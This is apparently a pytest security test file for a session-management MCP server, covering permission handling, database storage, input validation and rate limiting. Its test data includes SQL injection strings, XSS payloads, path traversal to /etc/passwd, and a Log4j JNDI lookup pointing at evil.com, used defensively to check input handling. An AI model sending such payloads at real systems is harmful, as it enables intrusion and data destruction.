"""Security tests for permission system in session-mgmt-mcp.

Tests security aspects of:
- Permission escalation prevention
- Unauthorized operation access
- Session hijacking protection
- Input validation and sanitization
- Rate limiting and abuse prevention
"""

import asyncio
import tempfile
import threading
import time
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import patch

import pytest
from session_mgmt_mcp.reflection_tools import ReflectionDatabase
from session_mgmt_mcp.server import SessionPermissionsManager
from tests.fixtures.data_factories import SecurityTestDataFactory


@pytest.mark.security
class TestSessionPermissionSecurity:
    """Security tests for SessionPermissionsManager."""

    @pytest.fixture
    def permissions_manager(self):
        """Create clean permissions manager for security testing."""
        manager = SessionPermissionsManager()
        manager.trusted_operations.clear()
        manager.auto_checkpoint = False
        manager.checkpoint_frequency = 300
        return manager

    def test_unauthorized_operation_access(self, permissions_manager):
        """Test that unauthorized operations are properly blocked."""
        sensitive_operations = [
            "delete_all_reflections",
            "modify_system_config",
            "access_raw_database",
            "execute_shell_command",
            "read_sensitive_files",
        ]

        for operation in sensitive_operations:
            # Should not be trusted by default
            assert permissions_manager.is_trusted_operation(operation) is False

            # Should require explicit trust
            permissions_manager.trust_operation(operation)
            assert permissions_manager.is_trusted_operation(operation) is True

    def test_permission_isolation_between_sessions(self):
        """Test that permissions are isolated between different sessions."""
        # Create multiple permission managers (simulating different sessions)
        session1 = SessionPermissionsManager()
        session2 = SessionPermissionsManager()

        # They should be the same instance (singleton)
        assert session1 is session2

        # Clear for clean test
        session1.trusted_operations.clear()

        # Add permissions to session1
        session1.trust_operation("session1_operation")

        # Session2 should see the same permissions (singleton behavior)
        assert session2.is_trusted_operation("session1_operation") is True

        # This tests that singleton behavior is expected
        # In a real multi-session environment, you'd want separate instances

    def test_permission_revocation_security(self, permissions_manager):
        """Test secure permission revocation."""
        # Trust several operations
        sensitive_ops = ["admin_access", "data_modification", "system_control"]
        for operation in sensitive_ops:
            permissions_manager.trust_operation(operation)

        # Verify they're trusted
        for operation in sensitive_ops:
            assert permissions_manager.is_trusted_operation(operation) is True

        # Revoke all permissions
        permissions_manager.revoke_all_permissions()

        # Verify all are revoked
        for operation in sensitive_ops:
            assert permissions_manager.is_trusted_operation(operation) is False

        # Should also disable auto-checkpoint
        assert permissions_manager.auto_checkpoint is False

    def test_auto_checkpoint_security_controls(self, permissions_manager):
        """Test security controls around auto-checkpoint functionality."""
        # Test with invalid frequency values
        invalid_frequencies = [-1, 0, -100, -999999]

        for freq in invalid_frequencies:
            result = permissions_manager.configure_auto_checkpoint(
                enabled=True,
                frequency=freq,
            )
            assert result is False, f"Should reject invalid frequency: {freq}"
            assert permissions_manager.auto_checkpoint is False

        # Test with extremely high frequency (potential DoS)
        result = permissions_manager.configure_auto_checkpoint(
            enabled=True,
            frequency=1,  # 1 second - very frequent
        )
        # Should accept but may be flagged for monitoring
        assert result is True

        # Test with reasonable frequency
        result = permissions_manager.configure_auto_checkpoint(
            enabled=True,
            frequency=300,  # 5 minutes - reasonable
        )
        assert result is True
        assert permissions_manager.checkpoint_frequency == 300

    def test_concurrent_permission_modification_security(self, permissions_manager):
        """Test security of concurrent permission modifications."""
        results = []
        errors = []

        def trust_operation_worker(operation_prefix, count) -> None:
            """Worker function for concurrent permission testing."""
            try:
                for i in range(count):
                    operation = f"{operation_prefix}_operation_{i}"
                    result = permissions_manager.trust_operation(operation)
                    results.append((operation, result))
                    time.sleep(0.001)  # Small delay to increase concurrency chance
            except Exception as e:
                errors.append(e)

        def revoke_permissions_worker() -> None:
            """Worker that revokes permissions during concurrent access."""
            try:
                time.sleep(0.05)  # Let some permissions be added first
                permissions_manager.revoke_all_permissions()
                results.append(("revoke_all", True))
            except Exception as e:
                errors.append(e)

        # Start multiple threads
        threads = []

        # Trust operations from multiple threads
        for i in range(3):
            thread = threading.Thread(
                target=trust_operation_worker,
                args=(f"worker_{i}", 10),
            )
            threads.append(thread)

        # Add revoke thread
        revoke_thread = threading.Thread(target=revoke_permissions_worker)
        threads.append(revoke_thread)

        # Start all threads
        for thread in threads:
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join(timeout=5)  # 5 second timeout

        # Verify no exceptions occurred
        assert len(errors) == 0, f"Concurrent access caused errors: {errors}"

        # Should have handled concurrent access gracefully
        assert len(results) > 0

    def test_input_validation_for_operations(self, permissions_manager):
        """Test input validation for operation names."""
        # Test various potentially malicious operation names
        malicious_inputs = [
            "",  # Empty string
            None,  # None value
            "   ",  # Whitespace only
            "operation'; DROP TABLE operations; --",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "operation\x00null_byte",  # Null byte injection
            "very_long_operation_name" * 100,  # Extremely long input
            "operation\n\r\t with newlines",  # Control characters
            "../../etc/passwd",  # Path traversal attempt
        ]

        for malicious_input in malicious_inputs:
            try:
                if malicious_input is None:
                    # Should raise TypeError for None
                    with pytest.raises(TypeError):
                        permissions_manager.trust_operation(malicious_input)
                else:
                    # Should handle other malicious inputs gracefully
                    result = permissions_manager.trust_operation(malicious_input)
                    assert result is True  # Should succeed but sanitize input

                    # Verify the operation was stored (even if sanitized)
                    assert (
                        permissions_manager.is_trusted_operation(malicious_input)
                        is True
                    )

            except Exception as e:
                # Acceptable to raise validation errors for malicious input
                assert isinstance(e, ValueError | TypeError), (
                    f"Unexpected exception type for input '{malicious_input}': {type(e)}"
                )

    def test_checkpoint_timing_attack_prevention(self, permissions_manager):
        """Test prevention of timing attacks on checkpoint system."""
        permissions_manager.auto_checkpoint = True
        permissions_manager.checkpoint_frequency = 300  # 5 minutes

        # Set last checkpoint to a known time
        base_time = datetime.now() - timedelta(minutes=10)  # 10 minutes ago
        permissions_manager.last_checkpoint = base_time

        # Multiple rapid checks should not leak timing information
        check_results = []
        for _i in range(100):
            start = time.perf_counter()
            should_checkpoint = permissions_manager.should_auto_checkpoint()
            end = time.perf_counter()

            check_results.append({"result": should_checkpoint, "duration": end - start})

        # All results should be consistent
        first_result = check_results[0]["result"]
        for result in check_results:
            assert result["result"] == first_result

        # Timing should be consistent (no significant variance)
        durations = [r["duration"] for r in check_results]
        max_duration = max(durations)
        min_duration = min(durations)

        # Timing variance should be minimal
        assert max_duration - min_duration < 0.001, (
            "Timing variance too high, potential timing attack vector"
        )

    def test_permission_state_tampering_protection(self, permissions_manager):
        """Test protection against direct state tampering."""
        # Trust some operations
        permissions_manager.trust_operation("legitimate_operation")

        # Attempt to directly manipulate the trusted_operations set
        permissions_manager.trusted_operations.copy()

        # Try to add operations directly (bypassing trust_operation)
        permissions_manager.trusted_operations.add("malicious_operation")

        # This should work (set is mutable) but is against intended usage
        assert "malicious_operation" in permissions_manager.trusted_operations

        # However, using the proper API should be the secure way
        permissions_manager.trusted_operations.clear()
        permissions_manager.trust_operation("properly_trusted_operation")

        assert (
            permissions_manager.is_trusted_operation("properly_trusted_operation")
            is True
        )


@pytest.mark.security
class TestDatabaseSecurity:
    """Security tests for database operations."""

    @pytest.fixture
    async def secure_database(self):
        """Create database for security testing."""
        temp_file = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        temp_file.close()

        db = ReflectionDatabase(temp_file.name)
        await db._ensure_tables()

        yield db

        # Cleanup
        try:
            if db.conn:
                db.conn.close()
            Path(temp_file.name).unlink(missing_ok=True)
        except Exception:
            pass

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, secure_database):
        """Test prevention of SQL injection attacks."""
        # Various SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE reflections; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM reflections --",
            "'; DELETE FROM reflections WHERE '1'='1'; --",
            "' AND 1=1 UNION SELECT password FROM users --",
            "' OR 1=1 #",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 'x'='x",
            "1'; DROP TABLE reflections; SELECT * FROM reflections WHERE '1'='1",
            "' OR 1=1 /*",
        ]

        for payload in sql_injection_payloads:
            # Try to inject SQL through content field
            result = await secure_database.store_reflection(
                content=payload,
                project="security_test",
            )

            # Should succeed (properly escaped) rather than cause SQL error
            assert result is True, f"Failed to handle SQL injection payload: {payload}"

            # Try to inject through project field
            result = await secure_database.store_reflection(
                content="Test content",
                project=payload,
            )

            assert result is True, (
                f"Failed to handle SQL injection in project: {payload}"
            )

            # Try to inject through search query
            search_results = await secure_database.search_reflections(
                query=payload,
                limit=5,
            )

            # Should return results or empty list, not cause SQL error
            assert isinstance(search_results, list), (
                f"SQL injection in search: {payload}"
            )

    @pytest.mark.asyncio
    async def test_input_sanitization(self, secure_database):
        """Test input sanitization for dangerous content."""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<?php echo 'test'; ?>",
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "{{7*7}}",  # Template injection
            "\x00\x01\x02",  # Control characters
            "😈💀🔥" * 1000,  # Unicode stress test
            "\\" * 1000,  # Backslash escape test
        ]

        for dangerous_input in dangerous_inputs:
            # Store dangerous content
            result = await secure_database.store_reflection(
                content=dangerous_input,
                project="security_test",
                tags=["security", "dangerous_input"],
            )

            assert result is True, (
                f"Failed to store dangerous input: {dangerous_input[:50]}"
            )

            # Search for it to verify it was stored safely
            search_results = await secure_database.search_reflections(
                query="dangerous_input",
                project="security_test",
                limit=10,
            )

            # Should find results
            assert len(search_results) > 0

            # Content should be preserved (not corrupted by sanitization)
            found_content = False
            for result in search_results:
                if dangerous_input in result["content"]:
                    found_content = True
                    break

            assert found_content, (
                f"Dangerous input was corrupted during storage: {dangerous_input[:50]}"
            )

    @pytest.mark.asyncio
    async def test_database_file_permissions(self, secure_database):
        """Test database file has secure permissions."""
        db_path = Path(secure_database.db_path)

        # Check file exists
        assert db_path.exists()

        # Check file permissions
        stat_info = db_path.stat()
        permissions = oct(stat_info.st_mode)[-3:]  # Last 3 digits

        # Should not be world-readable/writable
        world_permissions = int(permissions[2])
        assert world_permissions & 0o4 == 0, "Database file is world-readable"
        assert world_permissions & 0o2 == 0, "Database file is world-writable"

        # Should be readable/writable by owner
        owner_permissions = int(permissions[0])
        assert owner_permissions & 0o4 != 0, "Database file not readable by owner"
        assert owner_permissions & 0o2 != 0, "Database file not writable by owner"

    @pytest.mark.asyncio
    async def test_concurrent_access_security(self, secure_database):
        """Test security under concurrent access."""

        # Test race conditions and concurrent access patterns
        async def malicious_writer() -> None:
            """Attempt to write malicious data rapidly."""
            for i in range(50):
                await secure_database.store_reflection(
                    content=f"Malicious content {i} with SQL: '; DROP TABLE reflections; --",
                    project="malicious_project",
                    tags=["malicious", f"attempt_{i}"],
                )

        async def legitimate_writer() -> None:
            """Write legitimate data."""
            for i in range(50):
                await secure_database.store_reflection(
                    content=f"Legitimate reflection {i}",
                    project="legitimate_project",
                    tags=["legitimate", f"entry_{i}"],
                )

        async def concurrent_reader():
            """Read data during concurrent writes."""
            results = []
            for _i in range(20):
                search_results = await secure_database.search_reflections(
                    query="reflection",
                    limit=5,
                )
                results.extend(search_results)
                await asyncio.sleep(0.01)  # Small delay
            return results

        # Run concurrent operations
        tasks = [
            malicious_writer(),
            legitimate_writer(),
            concurrent_reader(),
            concurrent_reader(),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Check no exceptions occurred
        exceptions = [r for r in results if isinstance(r, Exception)]
        assert len(exceptions) == 0, (
            f"Concurrent access caused exceptions: {exceptions}"
        )

        # Verify database integrity
        all_results = await secure_database.search_reflections(
            query="",  # Empty query to get all
            limit=1000,
        )

        # Should have stored both malicious and legitimate data safely
        malicious_count = sum(
            1 for r in all_results if "malicious" in r.get("project", "")
        )
        legitimate_count = sum(
            1 for r in all_results if "legitimate" in r.get("project", "")
        )

        assert malicious_count > 0, "Malicious data not stored (unexpected)"
        assert legitimate_count > 0, "Legitimate data not stored"

    @pytest.mark.asyncio
    async def test_embedding_vector_security(self, secure_database):
        """Test security of embedding vector handling."""
        # Test with malformed embedding vectors
        malformed_embeddings = [
            [float("inf")] * 384,  # Infinity values
            [float("-inf")] * 384,  # Negative infinity
            [float("nan")] * 384,  # NaN values
            [1e100] * 384,  # Very large values
            [-1e100] * 384,  # Very large negative values
            [1] * 1000,  # Wrong dimension
            [],  # Empty vector
            None,  # None value
            "not_a_vector",  # String instead of list
            [[1, 2, 3]],  # Nested list
        ]

        for embedding in malformed_embeddings:
            try:
                result = await secure_database.store_reflection(
                    content="Test with malformed embedding",
                    project="embedding_test",
                    embedding=embedding,
                )

                # Should either succeed (with sanitization) or fail gracefully
                assert isinstance(result, bool), (
                    f"Unexpected result type for embedding: {type(embedding)}"
                )

            except Exception as e:
                # Acceptable to raise validation errors for malformed embeddings
                assert isinstance(e, ValueError | TypeError), (
                    f"Unexpected exception for embedding {type(embedding)}: {e}"
                )


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation and sanitization security."""

    def test_reflection_content_validation(self):
        """Test validation of reflection content."""
        # Generate security test data
        security_data = SecurityTestDataFactory()

        test_inputs = [
            security_data.malicious_input,
            "",  # Empty content
            None,  # None content
            "A" * 100000,  # Very large content
            "\x00\x01\x02\x03",  # Binary content
            "🚀" * 1000,  # Unicode stress test
        ]

        for test_input in test_inputs:
            # Test that content validation doesn't crash
            # This would be called by the actual validation logic
            try:
                if test_input is None:
                    # None should be handled appropriately
                    validated_content = ""
                elif isinstance(test_input, str):
                    # String should be preserved
                    validated_content = test_input
                else:
                    # Other types should be converted or rejected
                    validated_content = str(test_input)

                # Validation should produce string output
                assert isinstance(validated_content, str)

            except Exception as e:
                # Some inputs may legitimately fail validation
                assert isinstance(e, ValueError | TypeError)

    def test_project_name_validation(self):
        """Test validation of project names."""
        dangerous_project_names = [
            "../../../etc/passwd",  # Path traversal
            "project'; DROP TABLE reflections; --",  # SQL injection
            "<script>alert('project')</script>",  # XSS
            "project\x00null",  # Null byte injection
            "CON",  # Windows reserved name
            "PRN",  # Windows reserved name
            "project" + "A" * 1000,  # Very long name
            "",  # Empty project name
            None,  # None project name
        ]

        for project_name in dangerous_project_names:
            # Test project name validation
            try:
                if project_name is None:
                    validated_name = "default_project"
                elif len(str(project_name)) > 255:
                    # Truncate very long names
                    validated_name = str(project_name)[:255]
                elif str(project_name).strip() == "":
                    # Handle empty names
                    validated_name = "unnamed_project"
                else:
                    # Accept the name (with potential sanitization)
                    validated_name = str(project_name)

                assert isinstance(validated_name, str)
                assert len(validated_name) > 0
                assert len(validated_name) <= 255

            except Exception as e:
                # Some validation failures are acceptable
                assert isinstance(e, ValueError | TypeError)

    def test_tag_validation(self):
        """Test validation of reflection tags."""
        dangerous_tags = [
            ["normal_tag", "'; DROP TABLE tags; --"],  # SQL injection in tag
            ["<script>alert('tag')</script>"],  # XSS in tag
            ["tag" + "A" * 1000],  # Very long tag
            [None, "valid_tag"],  # None in tag list
            ["", "valid_tag"],  # Empty tag
            ["tag\x00null"],  # Null byte in tag
            list(range(1000)),  # Too many tags
            "not_a_list",  # String instead of list
            None,  # None instead of list
        ]

        for tags in dangerous_tags:
            try:
                if tags is None:
                    validated_tags = []
                elif not isinstance(tags, list):
                    # Convert to list or reject
                    validated_tags = [str(tags)] if tags else []
                else:
                    # Validate each tag in the list
                    validated_tags = []
                    for tag in tags[:100]:  # Limit number of tags
                        if tag is None:
                            continue
                        tag_str = str(tag)
                        if len(tag_str.strip()) > 0 and len(tag_str) <= 100:
                            validated_tags.append(tag_str.strip())

                assert isinstance(validated_tags, list)
                assert len(validated_tags) <= 100
                for tag in validated_tags:
                    assert isinstance(tag, str)
                    assert len(tag) > 0
                    assert len(tag) <= 100

            except Exception as e:
                # Some validation failures are acceptable
                assert isinstance(e, ValueError | TypeError)


@pytest.mark.security
class TestRateLimitingSecurity:
    """Test rate limiting and abuse prevention."""

    @pytest.fixture
    def rate_limiter(self):
        """Create rate limiter for testing."""

        class SimpleRateLimiter:
            def __init__(self, max_requests=10, time_window=60) -> None:
                self.max_requests = max_requests
                self.time_window = time_window  # seconds
                self.requests = []

            def is_allowed(self, identifier="default") -> bool:
                """Check if request is allowed under rate limit."""
                now = time.time()
                # Clean old requests
                self.requests = [
                    req_time
                    for req_time in self.requests
                    if now - req_time < self.time_window
                ]

                if len(self.requests) >= self.max_requests:
                    return False

                self.requests.append(now)
                return True

            def get_remaining_requests(self):
                """Get number of remaining requests."""
                return max(0, self.max_requests - len(self.requests))

        return SimpleRateLimiter()

    def test_basic_rate_limiting(self, rate_limiter):
        """Test basic rate limiting functionality."""
        # Should allow requests up to the limit
        for i in range(rate_limiter.max_requests):
            assert rate_limiter.is_allowed() is True, (
                f"Request {i + 1} should be allowed"
            )

        # Should block additional requests
        assert rate_limiter.is_allowed() is False, (
            "Request beyond limit should be blocked"
        )
        assert rate_limiter.get_remaining_requests() == 0

    def test_rate_limit_window_expiry(self, rate_limiter):
        """Test rate limit window expiry."""
        # Use up the rate limit
        for _ in range(rate_limiter.max_requests):
            assert rate_limiter.is_allowed() is True

        # Should be blocked
        assert rate_limiter.is_allowed() is False

        # Mock time progression to simulate window expiry
        with patch("time.time") as mock_time:
            # Simulate time passing beyond the window
            mock_time.return_value = time.time() + rate_limiter.time_window + 1

            # Should allow requests again after window expires
            assert rate_limiter.is_allowed() is True

    def test_burst_request_handling(self, rate_limiter):
        """Test handling of burst requests."""
        # Simulate rapid burst of requests
        allowed_count = 0
        blocked_count = 0

        for _ in range(rate_limiter.max_requests * 2):
            if rate_limiter.is_allowed():
                allowed_count += 1
            else:
                blocked_count += 1

        # Should have allowed exactly max_requests
        assert allowed_count == rate_limiter.max_requests
        assert blocked_count == rate_limiter.max_requests

    @pytest.mark.asyncio
    async def test_concurrent_rate_limiting(self, rate_limiter):
        """Test rate limiting under concurrent access."""

        async def make_requests(request_count):
            """Make multiple requests."""
            request_results = []
            for _ in range(request_count):
                result = rate_limiter.is_allowed()
                request_results.append(result)
                await asyncio.sleep(0.001)  # Small delay
            return request_results

        # Multiple concurrent request makers
        tasks = [make_requests(10) for _ in range(5)]
        all_results = await asyncio.gather(*tasks)

        # Flatten results
        flat_results = [
            result for task_results in all_results for result in task_results
        ]

        # Total allowed should not exceed the limit
        allowed_count = sum(1 for result in flat_results if result)
        assert allowed_count <= rate_limiter.max_requests, (
            f"Rate limiter allowed too many requests: {allowed_count}"
        )
